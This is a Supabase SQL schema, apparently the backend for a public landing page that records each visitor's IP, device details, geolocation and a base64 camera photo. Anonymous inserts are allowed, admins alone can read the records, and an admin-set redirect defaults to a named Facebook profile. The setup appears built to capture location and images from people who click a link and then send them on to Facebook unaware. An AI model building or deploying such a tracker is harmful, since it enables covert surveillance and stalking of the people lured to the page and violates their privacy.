-- Run in Supabase SQL Editor (free project)

create table if not exists public.visits (
  id uuid primary key default gen_random_uuid(),
  created_at timestamptz not null default now(),
  ip text,
  ip_source text,
  device_info jsonb,
  location_granted boolean not null default false,
  location jsonb,
  camera_granted boolean not null default false,
  photo_base64 text,
  referrer text,
  page_url text
);

alter table public.visits enable row level security;

-- Anyone can insert a visit (public landing page)
create policy "anon insert visits"
  on public.visits for insert
  to anon
  with check (true);

-- Only logged-in users (admin) can read
create policy "authenticated read visits"
  on public.visits for select
  to authenticated
  using (true);

create policy "authenticated delete visits"
  on public.visits for delete
  to authenticated
  using (true);

-- Admin-controlled redirect link (single row)
create table if not exists public.app_settings (
  id int primary key default 1 check (id = 1),
  redirect_url text not null default 'https://www.facebook.com',
  updated_at timestamptz not null default now()
);

insert into public.app_settings (id, redirect_url)
values (1, 'https://www.facebook.com/karoxghafoor')
on conflict (id) do nothing;

alter table public.app_settings enable row level security;

create policy "public read app settings"
  on public.app_settings for select
  to anon, authenticated
  using (true);

create policy "authenticated update app settings"
  on public.app_settings for update
  to authenticated
  using (true)
  with check (true);
